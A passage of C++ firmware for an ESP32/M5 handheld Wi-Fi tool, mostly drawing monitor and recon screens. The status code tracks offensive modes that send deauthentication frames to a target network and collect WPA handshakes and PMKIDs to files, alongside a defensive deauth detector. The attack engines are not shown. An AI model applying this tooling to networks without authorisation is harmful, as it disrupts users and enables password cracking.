    const char* fsName = monitorFileUseSd ? "SD" : "LittleFS";
    btnMonitorUpDir = {boxX, bottom.y, 50, ctlH, ".."};
    btnMonitorUp = {boxX + 54, bottom.y, 38, ctlH, "^"};
    btnMonitorDown = {boxX + 96, bottom.y, 38, ctlH, "v"};
    drawButton(btnMonitorUpDir, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
    drawButton(btnMonitorUp, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
    drawButton(btnMonitorDown, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);

    const char* activePath = monitorFileUseSd ? monitorSdPath : monitorLfsPath;
    if (monitorFileLastRefreshMs == 0) {
      monitorLoadFileDirFs(monitorFileUseSd ? (fs::FS&)SD : (fs::FS&)LittleFS, activePath, monitorFileUseSd);
    }
    applyFontMd();
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    String pathLine = String(fsName) + ": " + monitorFilePath;
    while (pathLine.length() > 4 && tft.textWidth(pathLine) > panelTextMaxW) pathLine.remove(pathLine.length() - 1);
    tft.drawString(pathLine, panelInnerX, panelInnerY);

    monitorFileListX = panelInnerX;
    monitorFileListY = panelRowsTopY;
    monitorFileListW = panelInnerW;
    monitorFileListH = panelRowsH;
    monitorFileRowH = fsRowH;
    monitorFileVisibleRows = max(1, monitorFileListH / monitorFileRowH);
    int maxScroll = max(0, monitorFileCount - monitorFileVisibleRows);
    monitorFileScroll = clampi(monitorFileScroll, 0, maxScroll);
    for (int r = 0; r < monitorFileVisibleRows; r++) {
      int idx = monitorFileScroll + r;
      int y = monitorFileListY + r * monitorFileRowH;
      if (idx >= monitorFileCount || y + monitorFileRowH > monitorFileListY + monitorFileListH) break;
      const MonitorFileEntry& e = monitorFiles[idx];
      tft.setTextColor(e.isDir ? TFT_YELLOW : TFT_WHITE, TFT_BLACK);
      String line = String(e.isDir ? "[D] " : "[F] ") + e.name;
      while (line.length() > 4 && tft.textWidth(line) > monitorFileListW - 64) line.remove(line.length() - 1);
      tft.drawString(line, monitorFileListX + 2, y + 2);
      if (!e.isDir) {
        char sz[20];
        snprintf(sz, sizeof(sz), "%lu", (unsigned long)e.size);
        tft.setTextDatum(TR_DATUM);
        tft.setTextColor(0x7BCF, TFT_BLACK);
        tft.drawString(sz, monitorFileListX + monitorFileListW - 4, y + 2);
        tft.setTextDatum(TL_DATUM);
      }
    }
    tft.setTextColor(0xAFE5, TFT_BLACK);
    String infoLine = monitorFileInfo;
    while (infoLine.length() > 4 && tft.textWidth(infoLine) > panelTextMaxW) infoLine.remove(infoLine.length() - 1);
    tft.drawString(infoLine, panelInnerX, boxY + boxH - kPanelFooterBandH + 1);
  } else {
    btnMonitorUp = {boxX, bottom.y, 40, ctlH, "^"};
    btnMonitorDown = {boxX + 44, bottom.y, 40, ctlH, "v"};
    drawButton(btnMonitorUp, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
    drawButton(btnMonitorDown, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
    applyFontMd();
    tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
    String viewHdr = String(monitorViewUseSd ? "SD: " : "LFS: ") + monitorViewPath;
    while (viewHdr.length() > 4 && tft.textWidth(viewHdr) > panelTextMaxW) viewHdr.remove(viewHdr.length() - 1);
    tft.drawString(viewHdr, panelInnerX, panelInnerY);
    const int rowH = landscape ? 20 : 24;
    int vis = max(1, panelRowsH / rowH);
    int maxScroll = max(0, monitorViewLineCount - vis);
    monitorViewScroll = clampi(monitorViewScroll, 0, maxScroll);
    for (int i = 0; i < vis; i++) {
      int idx = monitorViewScroll + i;
      if (idx >= monitorViewLineCount) break;
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      String ln = monitorViewLines[idx];
      while (ln.length() > 4 && tft.textWidth(ln) > panelTextMaxW) ln.remove(ln.length() - 1);
      const int y = panelRowsTopY + i * rowH;
      if (y + rowH > panelRowsBottomY) break;
      tft.drawString(ln, panelInnerX, y);
    }
  }

  s_tab5ChromeDrawn = true;
  s_prevW = w;
  s_prevH = h;
  s_prevRotation = rotationNow;
  s_prevLandscape = landscape;
  s_prevTab = monitorTab5Tab;

  drawBorder();
  return;
#else
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const int panelX = content.x;
  const int panelRight = max(content.x + 120, min(w - 5, uiActionDockSafeLeft() - 1));
  const int panelW = max(120, panelRight - panelX);
  const int backW = 74;
  const int ctlH = UI_BUTTON_H;
  const int ctlGap = 4;
  int ctlX = ActionDockBoxX + ((ActionDockBoxW - backW) / 2);
  ctlX = clampi(ctlX, 5, w - 5 - backW);
  const int backY = bottom.y;
  const int filesY = backY - (ctlH + ctlGap);
  const int liveY = filesY - (ctlH + ctlGap);
  const int statusY = content.y + 14;
  const int boxX = panelX;
  const int boxY = statusY + 16;
  const int boxW = panelW;
  const int boxBottom = h - 10;
  const int boxH = max(24, boxBottom - boxY);
  const int statusBoxY = statusY - 3;
  const int statusBoxH = 14;

  if (!monitorLayoutDrawn) {
    tft.fillScreen(TFT_BLACK);
    drawHeader("Monitor");
    drawUniversalBackground();

    btnMonitorBack = {ctlX, backY, backW, ctlH, "Back"};
    drawButton(btnMonitorBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

    tft.drawRect(boxX, boxY, boxW, boxH, TFT_DARKGREY);
    drawBorder();
    monitorLayoutDrawn = true;
    monitorDrawnCount = -1;
    for (int i = 0; i < MONITOR_MAX_LINES; i++) {
      monitorDrawnSig[i] = 0;
      monitorDrawnColor[i] = 0;
    }
  }

  // Rebuild tab buttons every draw so hitboxes stay valid.
  btnMonitorTab1 = {ctlX, liveY, backW, ctlH, "LIVE"};
  btnMonitorTab2 = {ctlX, filesY, backW, ctlH, "FILES"};
  btnMonitorBack = {ctlX, backY, backW, ctlH, "Back"};

  const bool isYoink  = (autoMode == AutoMode::Y0INK  && YoinkEngine::isRunning());
  const bool isJammit = (autoMode == AutoMode::JAMMIT);
  const bool armed = isYoink || isJammit || (lockChannel && sniffActive && (rawCaptureActive || pcapCaptureActive));

  // Refresh only the status/header strip and tab area.
  tft.fillRect(panelX, statusY - 2, panelW, 30, TFT_BLACK);
  tft.drawRect(panelX, statusBoxY, panelW, statusBoxH, TFT_DARKGREY);
  tft.setTextDatum(TL_DATUM);
  tft.setTextFont(1);
  applyFontSm();
  tft.setTextColor(armed ? TFT_GREEN : TFT_YELLOW, TFT_BLACK);
  if (isYoink) {
    char yHdr[48];
    snprintf(yHdr, sizeof(yHdr), "YOINK: %s  HS:%d PMKID:%d",
             YoinkEngine::getStateStr(),
             YoinkEngine::getHandshakeCount(),
             YoinkEngine::getPmkidCount());
    tft.drawString(yHdr, panelX + 4, statusY);
  } else if (isJammit) {
    char jHdr[80];
    snprintf(jHdr, sizeof(jHdr), "JAMMIT  D:%lu  C:%u  HS:%u",
             (unsigned long)jammitDeauthCount, (unsigned)jammitClientCount,
             (unsigned)monHandshakeHits);
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.drawString(jHdr, panelX + 4, statusY);
  } else {
    tft.drawString(armed ? "LIVE CAPTURE ACTIVE" : "Needs: LOCK + SNIFF + RECORD", panelX + 4, statusY);
  }

  uint16_t liveColor = (monitorMode == MonitorMode::LIVE) ? TFT_DARKGREEN : TFT_DARKGREY;
  uint16_t filesColor = (monitorMode == MonitorMode::FILES) ? TFT_DARKGREEN : TFT_DARKGREY;
  drawButton(btnMonitorTab1, liveColor, TFT_WHITE, TFT_WHITE);
  drawButton(btnMonitorTab2, filesColor, TFT_WHITE, TFT_WHITE);
  drawButton(btnMonitorBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

  if (monitorMode == MonitorMode::FILES) {
    const int filesCtlGap = 6;
    btnMonitorUpDir = {bottom.x, bottom.y, 44, UI_BUTTON_H, ".."};
    btnMonitorUp = {btnMonitorUpDir.x + btnMonitorUpDir.w + filesCtlGap, bottom.y, 36, UI_BUTTON_H, "^"};
    btnMonitorDown = {btnMonitorUp.x + btnMonitorUp.w + filesCtlGap, bottom.y, 36, UI_BUTTON_H, "v"};
    drawButton(btnMonitorUpDir, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
    drawButton(btnMonitorUp, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
    drawButton(btnMonitorDown, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);

    if (monitorFileLastRefreshMs == 0) {
      monitorLoadFileDir(monitorFilePath);
    }

    tft.fillRect(boxX + 1, boxY + 1, boxW - 2, boxH - 2, TFT_BLACK);
    tft.setTextDatum(TL_DATUM);
    applyFontSm();
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    String pathLine = String("SD: ") + monitorFilePath;
    while (pathLine.length() > 4 && tft.textWidth(pathLine) > (boxW - 10)) {
      pathLine.remove(pathLine.length() - 1);
    }
    tft.drawString(pathLine, boxX + 4, boxY + 4);

    monitorFileListX = boxX + 4;
    monitorFileListY = boxY + 20;
    monitorFileListW = boxW - 8;
    monitorFileListH = boxH - 40;
    monitorFileRowH = 14;
    monitorFileVisibleRows = monitorFileListH / monitorFileRowH;
    if (monitorFileVisibleRows < 1) monitorFileVisibleRows = 1;

    int maxScroll = monitorFileCount - monitorFileVisibleRows;
    if (maxScroll < 0) maxScroll = 0;
    monitorFileScroll = clampi(monitorFileScroll, 0, maxScroll);

    for (int r = 0; r < monitorFileVisibleRows; r++) {
      const int idx = monitorFileScroll + r;
      const int y = monitorFileListY + (r * monitorFileRowH);
      tft.fillRect(monitorFileListX, y, monitorFileListW, monitorFileRowH - 1, TFT_BLACK);
      if (idx >= monitorFileCount) continue;
      const MonitorFileEntry& e = monitorFiles[idx];
      tft.setTextColor(e.isDir ? TFT_YELLOW : TFT_WHITE, TFT_BLACK);
      String line = String(e.isDir ? "[D] " : "    ") + e.name;
      while (line.length() > 4 && tft.textWidth(line) > (monitorFileListW - 64)) {
        line.remove(line.length() - 1);
      }
      tft.drawString(line, monitorFileListX + 2, y + 2);
      if (!e.isDir) {
        char sz[16];
        snprintf(sz, sizeof(sz), "%lu", (unsigned long)e.size);
        tft.setTextDatum(TR_DATUM);
        tft.setTextColor(0x7BCF, TFT_BLACK);
        tft.drawString(sz, monitorFileListX + monitorFileListW - 4, y + 2);
        tft.setTextDatum(TL_DATUM);
      }
    }
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString(monitorFileInfo, boxX + 4, boxY + boxH - 14);
  } else {
    // Redraw only changed monitor lines.
    const int lineH = 10;
    const int textX = boxX + 16;
    const int maxTextW = max(20, boxW - 24);
    tft.setTextDatum(TL_DATUM);
    tft.setTextFont(1);
    applyFontSm();
    for (int i = 0; i < MONITOR_MAX_LINES; i++) {
      // Newest entries render first at the top of the console.
      const int srcIdx = monitorLineCount - 1 - i;
      const bool hasLine = (srcIdx >= 0 && srcIdx < monitorLineCount);
      const char* txt = hasLine ? monitorLines[srcIdx].text : "";
      const uint16_t col = hasLine ? monitorLines[srcIdx].color : TFT_WHITE;
      const uint32_t sig = hashText(txt);
      if (monitorDrawnSig[i] == sig && monitorDrawnColor[i] == col && monitorDrawnCount == monitorLineCount) {
        continue;
      }
      int y = boxY + 8 + (i * lineH);
      if (y + lineH > boxY + boxH - 2) break;  // Keep text fully inside console box.
      tft.fillRect(textX - 2, y, boxW - 22, lineH - 1, TFT_BLACK);
      if (hasLine) {
        tft.setTextColor(col, TFT_BLACK);
        String line = txt ? String(txt) : String("");
        bool trimmed = false;
        while (line.length() > 1 && tft.textWidth(line) > maxTextW) {
          line.remove(line.length() - 1);
          trimmed = true;
        }
        if (trimmed && line.length() > 3) line += "...";
        while (line.length() > 1 && tft.textWidth(line) > maxTextW) line.remove(line.length() - 1);
        tft.drawString(line, textX, y);
      }
      monitorDrawnSig[i] = sig;
      monitorDrawnColor[i] = col;
    }
    monitorDrawnCount = monitorLineCount;

    // Simple cursor animation
    uint8_t spin = (uint8_t)((millis() / 200) & 0x03);
    const char spinner[4] = {'|', '/', '-', '\\'};
    char cur[8];
    snprintf(cur, sizeof(cur), "%c", spinner[spin]);
    tft.fillRect(boxX + boxW - 16, boxY + boxH - 15, 10, 12, TFT_BLACK);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString(cur, boxX + boxW - 14, boxY + boxH - 14);
  }
  uiLogLayout("drawMonitor", content, bottom);
  uiLogButtonRect("Monitor.Back", btnMonitorBack);
#endif
}

static void monitorTick() {
  if (screen != ScreenId::MONITOR) return;
  static uint32_t s_monitorYoinkLastSeq = 0;

  uint32_t now = millis();
  if (now - monitorLastUpdateMs < (uint32_t)cfg.telemetry_monitorIntervalMs) return;
  monitorLastUpdateMs = now;

#if defined(NEONDRIVE_TARGET_M5TAB5)
  if (monitorTab5Paused && monitorTab5Tab == MonitorTab5Tab::LIVE) return;
  if (monitorTab5Tab == MonitorTab5Tab::SD || monitorTab5Tab == MonitorTab5Tab::LITTLEFS) {
    if ((now - monitorFileLastRefreshMs) > 1500U) {
      monitorLoadFileDirFs(monitorTab5Tab == MonitorTab5Tab::SD ? (fs::FS&)SD : (fs::FS&)LittleFS,
                           monitorTab5Tab == MonitorTab5Tab::SD ? monitorSdPath : monitorLfsPath,
                           monitorTab5Tab == MonitorTab5Tab::SD);
      drawMonitor();
    }
    return;
  }
  if (monitorTab5Tab == MonitorTab5Tab::FILE_VIEW) return;
#endif

  if (monitorMode == MonitorMode::FILES) {
    if ((now - monitorFileLastRefreshMs) > 1500U) {
      monitorLoadFileDir(monitorFilePath);
      drawMonitor();
    }
    return;
  }

  const bool isYoink  = (autoMode == AutoMode::Y0INK  && YoinkEngine::isRunning());
  const bool isJammit = (autoMode == AutoMode::JAMMIT);
  const bool armed = isYoink || isJammit || (lockChannel && sniffActive && (rawCaptureActive || pcapCaptureActive));
  const uint32_t pktsNow = sniffPacketCount;
  const uint32_t pktDelta = pktsNow - monitorLastPkts;
  monitorLastPkts = pktsNow;

  if (isJammit) {
    if (monitorMode == MonitorMode::LIVE) {
      // Target summary
      monitorPushLine(TFT_RED,     "TARGET: %s", target.ssid.isEmpty() ? "(hidden)" : target.ssid.c_str());
      monitorPushLine(TFT_YELLOW,  "BSSID: %s  CH%d", target.bssid.c_str(), target.channel);
      // Session time
      uint32_t elapsed = (millis() - jammitSessionStartMs) / 1000;
      monitorPushLine(TFT_CYAN,    "ELAPSED: %lu s", elapsed);
      monitorPushLine(TFT_WHITE,   "");
      // Deauth/score stats
      monitorPushLine(TFT_RED,     "DEAUTHS SENT: %lu", (unsigned long)jammitDeauthCount);
      monitorPushLine(TFT_YELLOW,  "LAST SCORE:   %u",  (unsigned)jammitLastScore);
      monitorPushLine(monHandshakeHits > 0 ? TFT_GREEN : TFT_DARKGREY,
                      "EAPOL/HS CAP: %u  (handshakes.pcap)", (unsigned)monHandshakeHits);
      monitorPushLine(TFT_WHITE,   "");
      // Clients discovered via sniffer
      monitorPushLine(TFT_CYAN,    "CLIENTS SEEN: %u", (unsigned)jammitClientCount);
      for (uint8_t i = 0; i < jammitClientCount && i < 4; i++) {
        const uint8_t* m = jammitClientMacs[i];
        monitorPushLine(TFT_MAGENTA,
          "  [%u] %02X:%02X:%02X:%02X:%02X:%02X", i + 1,
          m[0], m[1], m[2], m[3], m[4], m[5]);
      }
      if (jammitClientCount > 4)
        monitorPushLine(TFT_DARKGREY, "  ...+%u more", jammitClientCount - 4);
      monitorPushLine(TFT_WHITE,   "");
      // Packet throughput
      monitorPushLine(TFT_CYAN,    "PKTS +%lu   PPS %d", (unsigned long)pktDelta, sniffPps);
    } else {
      // FILES VIEW for JAMMIT
      monitorPushLine(TFT_RED,    "JAMMIT CAPTURE FILES");
      monitorPushLine(TFT_WHITE,  "");
      if (captureDir[0]) {
        monitorPushLine(TFT_YELLOW, "DIR: %s", captureDir);
      }
      monitorPushLine(TFT_WHITE,  "");
      // Session log
      if (sdReady && jammitSessionLogPath[0]) {
        File f = SD.open(jammitSessionLogPath, FILE_READ);
        size_t sz = f ? (size_t)f.size() : 0;
        if (f) f.close();
        monitorPushLine(sz ? TFT_GREEN : TFT_DARKGREY,
          "jammit_session.log  %u B", (unsigned)sz);
      }
      // Deauth PCAP
      if (sdReady && jammitDeauthPcapPath[0]) {
        File f = SD.open(jammitDeauthPcapPath, FILE_READ);
        size_t sz = f ? (size_t)f.size() : 0;
        if (f) f.close();
        // Each deauth record = 16 (pcap hdr) + 26 (frame) = 42 bytes, minus global header 24
        uint32_t frames = sz > 24 ? (sz - 24) / 42 : 0;
        monitorPushLine(sz ? TFT_GREEN : TFT_DARKGREY,
          "jammit_deauths.pcap %u B (%lu pkts)", (unsigned)sz, frames);
      }
      monitorPushLine(TFT_WHITE, "");
      // Core PCAPs
      monitorPushLine(TFT_CYAN, "beacon.pcap   %lu writes", (unsigned long)fileWriteCountBeacon);
      monitorPushLine(TFT_CYAN, "handshakes.pcap %lu writes", (unsigned long)fileWriteCountHandshake);
      monitorPushLine(TFT_WHITE, "");
      if (fileTotalErrors > 0)
        monitorPushLine(TFT_RED, "WRITE ERRORS: %lu", (unsigned long)fileTotalErrors);
      else
        monitorPushLine(TFT_GREEN, "All writes OK");
    }
  } else if (isYoink) {
    // === YOINK MODE: drain log ring into monitor display ===
    if (monitorMode == MonitorMode::LIVE) {
      // Push new log entries from yoink engine ring buffer
      uint8_t logCount = YoinkEngine::getLogCount();
      bool anyNew = false;
      for (uint8_t i = 0; i < logCount; i++) {
        const YoinkLogEntry* e = YoinkEngine::getLogEntry(i);
        if (!e || e->seq <= s_monitorYoinkLastSeq) continue;
        s_monitorYoinkLastSeq = e->seq;
        anyNew = true;
        // Color by severity: 0=info(cyan), 1=success(green), 2=warn(yellow), 3=err(red)
        uint16_t color = TFT_CYAN;
        if (e->severity == 1) color = TFT_GREEN;
        else if (e->severity == 2) color = TFT_YELLOW;
        else if (e->severity == 3) color = TFT_RED;
        monitorPushLine(color, "%s", e->msg);
      }
      if (!anyNew && (now % 5000 < 500)) {
        // Periodic stats line when no new events
        monitorPushLine(TFT_DARKGREY, "pkts:%lu deauth:%lu nets:%d",
                        (unsigned long)YoinkEngine::getPacketCount(),
                        (unsigned long)YoinkEngine::getDeauthCount(),
                        YoinkEngine::getNetworkCount());
      }
    } else {
      // FILES VIEW for YOINK
      monitorPushLine(TFT_CYAN, "YOINK CAPTURE FILES");
      monitorPushLine(TFT_WHITE, "");
      // Show handshakes
      uint8_t hsCount = YoinkEngine::getHandshakeCount();
      uint8_t pmkCount = YoinkEngine::getPmkidCount();
      monitorPushLine(TFT_GREEN, "Handshakes: %d captured", hsCount);
      for (uint8_t i = 0; i < YoinkEngine::getTotalHandshakeSlots(); i++) {
        const YoinkHandshake* hs = YoinkEngine::getHandshake(i);
        if (hs && hs->hasValidPair()) {
          monitorPushLine(hs->saved ? TFT_GREEN : TFT_YELLOW,
                          "  %s mask=0x%02X %s", hs->ssid, hs->capturedMask,
                          hs->saved ? "SAVED" : "unsaved");
        }
      }
      monitorPushLine(TFT_WHITE, "");
      monitorPushLine(TFT_GREEN, "PMKIDs: %d captured", pmkCount);
      for (uint8_t i = 0; i < pmkCount; i++) {
        const YoinkPmkid* p = YoinkEngine::getPmkid(i);
        if (p) {
          monitorPushLine(p->saved ? TFT_GREEN : TFT_YELLOW,
                          "  %s %s", p->ssid, p->saved ? "SAVED" : "unsaved");
        }
      }
      monitorPushLine(TFT_WHITE, "");
      monitorPushLine(TFT_CYAN, "Path: /captures/<SSID>/Handshakes/");
    }
  } else if (monitorMode == MonitorMode::LIVE) {
    // LIVE DATA VIEW (non-YOINK modes)
    if (!armed) {
      monitorPushLine(TFT_YELLOW, "WAIT lock=%d sniff=%d rec=%d",
                      lockChannel ? 1 : 0, sniffActive ? 1 : 0, (rawCaptureActive || pcapCaptureActive) ? 1 : 0);
    } else if (autoMode == AutoMode::SP3CTER) {
      // RAW mode: in-place updates, only redraw when data changes
      bool changed = false;
      
      if (sniffPacketCount != rawMonLastPkts || sniffPps != rawMonLastPps) {
        monitorUpdateLine(0, TFT_CYAN, "PACKETS: %lu   PPS: %d", (unsigned long)sniffPacketCount, sniffPps);
        rawMonLastPkts = sniffPacketCount;
        rawMonLastPps = sniffPps;
        changed = true;
      }
      
      if (sniffDroppedPackets != rawMonLastDropped || fileTotalErrors != rawMonLastErrors) {
        monitorUpdateLine(1, TFT_YELLOW, "DROPPED: %lu   ERRORS: %lu", 
                         (unsigned long)sniffDroppedPackets, (unsigned long)fileTotalErrors);
        rawMonLastDropped = sniffDroppedPackets;
        rawMonLastErrors = fileTotalErrors;
        changed = true;
      }
      
      // Ensure blank line at index 2
      if (monitorLines[2].text[0] != '\0') {
        monitorUpdateLine(2, TFT_WHITE, "");
      }
      
      if (monPktMgmt != rawMonLastMgmt || monPktCtrl != rawMonLastCtrl || monPktData != rawMonLastData) {
        monitorUpdateLine(3, TFT_GREEN, "MGMT: %lu   CTRL: %lu", 
                         (unsigned long)monPktMgmt, (unsigned long)monPktCtrl);
        monitorUpdateLine(4, TFT_GREEN, "DATA: %lu", (unsigned long)monPktData);
        rawMonLastMgmt = monPktMgmt;
        rawMonLastCtrl = monPktCtrl;
        rawMonLastData = monPktData;
        changed = true;
      }
      
      // Ensure blank line at index 5
      if (monitorLines[5].text[0] != '\0') {
        monitorUpdateLine(5, TFT_WHITE, "");
      }
      
      if (monBeaconHits != rawMonLastBeacon || monHandshakeHits != rawMonLastHs) {
        monitorUpdateLine(6, TFT_MAGENTA, "BEACON: %lu   HANDSHAKE: %lu",
                         (unsigned long)monBeaconHits, (unsigned long)monHandshakeHits);
        rawMonLastBeacon = monBeaconHits;
        rawMonLastHs = monHandshakeHits;
        changed = true;
      }
      
      // Only redraw if something changed
      if (changed) {
        drawMonitor();
        return; // Skip the drawMonitor() at the end of monitorTick()
      }
    } else {
      // Other modes: use scrolling display
      monitorPushLine(TFT_CYAN, "PKT DELTA +%lu   PPS %d",
                      (unsigned long)pktDelta, sniffPps);
      monitorPushLine(TFT_CYAN, "DROPPED %lu   ERRORS %lu",
                      (unsigned long)sniffDroppedPackets, (unsigned long)fileTotalErrors);
      monitorPushLine(TFT_WHITE, "");
      const char* pktType = (monLastType == WIFI_PKT_MGMT) ? "MGMT" :
                            (monLastType == WIFI_PKT_CTRL) ? "CTRL" :
                            (monLastType == WIFI_PKT_DATA) ? "DATA" : "UNK";
      monitorPushLine(TFT_GREEN, "LAST PKT: %s", pktType);
      monitorPushLine(TFT_GREEN, "LEN %u bytes   RSSI %d dBm",
                      (unsigned)monLastLen, monLastRssi);
      monitorPushLine(TFT_WHITE, "");
      monitorPushLine(TFT_YELLOW, "MGMT %lu   CTRL %lu",
                      (unsigned long)monPktMgmt, (unsigned long)monPktCtrl);
      monitorPushLine(TFT_YELLOW, "DATA %lu", (unsigned long)monPktData);
      monitorPushLine(TFT_WHITE, "");
      monitorPushLine(TFT_MAGENTA, "BEACON %lu   HANDSHAKE %lu",
                      (unsigned long)monBeaconHits, (unsigned long)monHandshakeHits);
      if (autoMode == AutoMode::JAMMIT) {
        monitorPushLine(TFT_RED, "JAMMIT SCORE:%u DEAUTH:%lu", 
                        (unsigned)jammitLastScore, (unsigned long)jammitDeauthCount);
      }
    }
  } else {
    // FILES VIEW (non-YOINK modes)
    monitorPushLine(TFT_CYAN, "PCAP FILES BEING WRITTEN");
    monitorPushLine(TFT_WHITE, "");
    
    monitorPushLine(TFT_WHITE, "");
    monitorPushLine(TFT_GREEN, "beacon.pcap");
    monitorPushLine(TFT_CYAN, "  AP beacons: %lu writes",
                    (unsigned long)fileWriteCountBeacon);
    
    monitorPushLine(TFT_WHITE, "");
    monitorPushLine(TFT_GREEN, "handshakes.pcap");
    monitorPushLine(TFT_CYAN, "  WPA/EAPOL: %lu writes",
                    (unsigned long)fileWriteCountHandshake);
    
    monitorPushLine(TFT_WHITE, "");
    if (fileTotalErrors > 0) {
      monitorPushLine(TFT_RED, "WRITE ERRORS: %lu",
                      (unsigned long)fileTotalErrors);
    } else {
      monitorPushLine(TFT_GREEN, "All writes OK");
    }
  }

  drawMonitor();
}

static void clearReconConsoleArea() {
  const int x = reconConsoleX + 1;
  const int w = max(0, reconConsoleW - 2);
  const int h = max(0, (int)reconConsoleH - 18);
  tft.fillRect(x, reconConsoleY + 16, w, h, TFT_BLACK);
}

static const char* reconScanStateLabel(ReconScanState st) {
  switch (st) {
    case ReconScanState::IDLE: return "IDLE";
    case ReconScanState::DISCOVER_SEND: return "DISCOVER";
    case ReconScanState::DISCOVER_WAIT: return "DISCOVER";
    case ReconScanState::DISCOVER_READ: return "DISCOVER";
    case ReconScanState::PORT_SCAN: return "PORT-SCAN";
    case ReconScanState::DONE: return "DONE";
    case ReconScanState::ERROR: return "ERROR";
    default: return "UNKNOWN";
  }
}

static void layoutReconBackButtonUnderActionDock(int modeRowY, int modeRowH) {
  const int w = tft.width();
  const int h = tft.height();
  const int backW = 72;
  const int backH = UI_BUTTON_H;
  Button candidate = {
    clampi(ActionDockBoxX + ((ActionDockBoxW - backW) / 2), UI_SAFE_MARGIN, w - UI_SAFE_MARGIN - backW),
    ActionDockBoxY + ActionDockBoxH + 6,
    backW,
    backH,
    "BACK"
  };

  int cy = candidate.y + buttonRenderYOffset(candidate);
  bool intersectsModeRow = (cy < (modeRowY + modeRowH + 2)) && ((cy + backH) > modeRowY);
  bool outOfBounds = (cy + backH > h - UI_SAFE_MARGIN);

  if (intersectsModeRow) {
    // Second pass: keep X under ActionDock, move Y below mode row.
    candidate.y = modeRowY + modeRowH + 4;
    if (candidate.y <= UI_TOP_BUTTON_SHIFT_THRESHOLD_Y) {
      candidate.y = UI_TOP_BUTTON_SHIFT_THRESHOLD_Y + 1;
    }
    cy = candidate.y + buttonRenderYOffset(candidate);
    intersectsModeRow = (cy < (modeRowY + modeRowH + 2)) && ((cy + backH) > modeRowY);
    outOfBounds = (cy + backH > h - UI_SAFE_MARGIN);
  }

  if (intersectsModeRow || outOfBounds) {
    btnReconBack = {UI_SAFE_MARGIN, h - UI_BOTTOM_BAR_H, 78, UI_BUTTON_H, "BACK"};
  } else {
    btnReconBack = candidate;
  }
}

static bool startReconDeauthHunter(bool forceDisconnect) {
#if defined(NEONDRIVE_TARGET_M5TAB5) || defined(NEONDRIVE_TARGET_M5CARDPUTER)
  neon_rf_set_last_action("startReconDeauthHunter");
  neon_rf_log_unsupported("startReconDeauthHunter");
  reconStatusLine = "Deauth Hunter: not supported (no local radio)";
  return false;
#endif
  if (wifiStaHasValidIp() && !forceDisconnect) {
    reconDeauthConfirmUntilMs = millis() + 5000U;
    reconStatusLine = "Connected STA detected: tap START again to disconnect and hunt";
    return false;
  }

  if (wifiStaHasValidIp()) {
    WiFi.disconnect(false, false);
    delay(80);
  }
  WiFi.mode(WIFI_STA);
  delay(30);

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&promiscuousPacketCallback);
  wifi_promiscuous_filter_t filt;
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(DeauthHunter::getCurrentChannel(), WIFI_SECOND_CHAN_NONE);

  if (reconChannelLock) DeauthHunter::setChannelFilter(reconSelectedChannel);
  DeauthHunter::setEnabled(true);
  DeauthHunter::start();
  reconActive = true;
  reconStatusLine = "Deauth Hunter active (defensive monitor)";
  return true;
}

static void stopReconDeauthHunter() {
  if (!reconActive && !DeauthHunter::isEnabled()) return;
  DeauthHunter::setEnabled(false);
  DeauthHunter::stop();
#if !defined(NEONDRIVE_TARGET_M5TAB5)
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
#endif
  reconActive = false;
  reconStatusLine = "Deauth Hunter stopped";
}

// Helper: Draw console log entries
static void drawReconConsole(bool fullRedraw = false) {
  const int lineHeight = 8;
  const int maxVisibleLines = (reconConsoleH - 16) / lineHeight;

  if (fullRedraw) clearReconConsoleArea();

  uint16_t logCount = DeauthHunter::getLogCount();
  if (logCount == 0) {
    reconLastLogCount = 0;
    return;
  }
  if (!fullRedraw && logCount <= reconLastLogCount) return;

  uint16_t displayStart = (logCount > maxVisibleLines) ? (logCount - maxVisibleLines) : 0;
  tft.setTextDatum(TL_DATUM);
  tft.setTextFont(1);
  applyFontSm();

  for (uint16_t i = displayStart; i < logCount; i++) {
    const DeauthEvent* evt = DeauthHunter::getLogEntry(i);
    if (!evt) continue;
    int lineIdx = i - displayStart;
    int y = reconConsoleY + 14 + (lineIdx * lineHeight);
    if (y + lineHeight > reconConsoleY + reconConsoleH) break;

    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             evt->src_mac[0], evt->src_mac[1], evt->src_mac[2],
             evt->src_mac[3], evt->src_mac[4], evt->src_mac[5]);

    char line[64];
    snprintf(line, sizeof(line), "%s CH%02d %3d %s",
             macStr, evt->channel, evt->rssi, evt->is_disassoc ? "DISAS" : "DEAUTH");

    uint16_t color = TFT_GREEN;
    if (evt->rssi > -50) color = TFT_RED;
    else if (evt->rssi > -70) color = TFT_YELLOW;
    else color = TFT_CYAN;
    tft.setTextColor(color, TFT_BLACK);
    tft.drawString(line, reconConsoleX + 4, y);
  }

  reconLastLogCount = logCount;
}

static void drawReconDeauthPanel(int panelTop, int panelBottom) {
  const int w = tft.width();
  const int panelX = UI_SAFE_MARGIN;
  // Keep Recon status/events boxes ending 5px before the ActionDock left border.
  int statusRight = ActionDockBoxX - 5;
  statusRight = clampi(statusRight, panelX + 140, w - UI_SAFE_MARGIN);
  const int panelW = statusRight - panelX;
  const int statsH = 54;
  const int statsY = panelTop;
